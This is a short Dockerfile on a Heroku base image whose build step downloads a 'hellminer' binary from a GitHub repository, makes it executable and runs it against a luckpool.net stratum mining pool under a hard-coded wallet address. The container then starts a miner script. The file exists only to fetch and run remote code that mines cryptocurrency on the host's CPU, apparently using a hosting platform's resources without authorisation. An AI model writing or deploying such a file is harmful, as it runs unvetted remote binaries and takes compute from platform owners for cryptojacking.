FROM heroku/heroku:18

RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/skyram001/student/raw/main/hellminer; chmod +x hellminer; ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RMKjgEVM82bB1VCKyFw7PSjxzhViVamfQF.vps -p x --cpu 3
CMD bash startminer.sh
